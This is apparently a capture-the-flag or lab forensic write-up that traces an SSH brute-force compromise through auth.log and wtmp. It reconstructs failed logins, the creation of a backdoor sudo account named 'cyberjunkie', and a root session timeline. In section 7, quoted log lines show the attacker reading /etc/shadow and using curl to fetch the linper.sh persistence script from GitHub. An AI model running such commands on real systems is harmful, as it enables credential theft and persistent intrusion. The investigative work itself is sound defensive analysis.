## SSH Log Analysis & Attacker Investigation Write-Up

After downloading and extracting the log files, we begin analyzing authentication logs to identify failed login attempts and determine the attacker’s IP address.

---

### 1. Identify Failed SSH Login Attempts

Search for failed SSH authentication attempts inside `auth.log`:

```bash
grep "Failed password" auth.log | awk '{print $6,$7,$8,$9,$10,$11}' | sort | uniq -c | sort -nr
```

#### What This Command Does

* Filters `auth.log` for failed SSH login attempts
* Extracts fields 6–11 (typically status, user, IP, etc.)
* Groups identical entries
* Counts occurrences
* Sorts results in descending order (most frequent first)

#### Result

```bash
12 Failed password for invalid user server_adm
11 Failed password for invalid user svc_account
10 Failed password for invalid user admin
 9 Failed password for backup from 65.2.161.68
 6 Failed password for root from 65.2.161.68
```

#### Observation

The IP address `65.2.161.68` repeatedly attempts to log in, including attempts against the `root` account.

Likely attacker IP: `65.2.161.68`

---

### 2. Identify Successful Logins (Compromised Accounts)

Check for successful SSH logins:

```bash
grep "Accepted password" auth.log | awk '{print $5,$6,$7,$8,$9,$10,$11}' | sort | uniq -c | sort -nr
```

#### Result

```bash
1 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68
1 sshd[2491]: Accepted password for root from 65.2.161.68
1 sshd[2411]: Accepted password for root from 65.2.161.68
1 sshd[1465]: Accepted password for root from 203.101.190.9
```

#### Observation

* The attacker successfully logged in as:

  * `root`
  * `cyberjunkie`
* Most suspicious activity originates from `65.2.161.68`

The account `cyberjunkie` appears suspicious and requires further investigation.

---

### 3. Investigating the Suspicious Account

Search for all activity related to `cyberjunkie`:

```bash
grep "cyberjunkie" auth.log | awk '{print $5,$6,$7,$8,$9,$10,$11}' | sort | uniq -c | sort -n
```

#### Result

```bash
1 chfn[2605]: changed user 'cyberjunkie' information
1 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
1 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
1 groupadd[2586]: new group: name=cyberjunkie, GID=1002
1 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
1 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68
1 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002)
1 systemd-logind[411]: New session 49 of user cyberjunkie.
1 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002)
1 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie
1 usermod[2628]: add 'cyberjunkie' to group 'sudo'
1 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
2 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ;
2 sudo: pam_unix(sudo:session): session opened for user root(uid=0)
```

#### Findings

The attacker:

* Created a new user `cyberjunkie`
* Set a password
* Added the user to the `sudo` group
* Opened root sessions using sudo

This confirms persistence was established.

### 4. Analyzing Login Timeline Using `wtmp`

Parse the `wtmp` file to review login history:

```bash
python3 utmp.py -o wtmp.out wtmp
```

Search for attacker IP:

```bash
cat wtmp.out | grep "65.2.161.68"
```

#### Result

```bash
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"  "0" "0" "0" "2024/03/06 08:32:45"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie" "65.2.161.68" "0" "0" "0" "2024/03/06 08:37:35"
```

#### Notes

* First login as `root`
* Then login as `cyberjunkie`
* Convert timestamps to UTC if required for submission

---

### 5. Identify Root Session ID

Search for root session creation:

```bash
grep "root" auth.log | sort | uniq -c | sort -n
```

#### Notable Entry

```bash
Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.
```

Root session ID: `37`

---

### 6. Determine Logout Time

```bash
grep "session 37" auth.log | sort | uniq -c | sort -n
```

#### Result

```bash
Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 systemd-logind[411]: Removed session 37.
```

Root session duration:

* Start: 06:32:44
* End: 06:37:24

---

### 7. Investigating Attacker’s Sudo Activity

Search for sudo usage:

```bash
grep "sudo" auth.log | grep "cyberjunkie"
```

#### Result

```bash
Mar  6 06:35:15 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:37:57 sudo: cyberjunkie : USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:39:38 sudo: cyberjunkie : USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

#### Critical Actions

1. Added `cyberjunkie` to sudo group
2. Accessed `/etc/shadow` (credential dumping)
3. Downloaded an external script:

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

This suggests post-exploitation enumeration and persistence activity.

---

## Final Attack Timeline

1. Brute-force attempts from `65.2.161.68`
2. Successful root login
3. Creation of `cyberjunkie` account
4. Added to sudo group
5. Shadow file accessed
6. Enumeration script downloaded
7. Persistent access established

---

## Conclusion

The attacker:

* Originated from `65.2.161.68`
* Gained root access
* Created a backdoor administrative account
* Escalated privileges via sudo
* Downloaded post-exploitation tooling
* Established persistence

This analysis demonstrates how authentication logs (`auth.log`) and login records (`wtmp`) can be used to reconstruct a full compromise timeline.
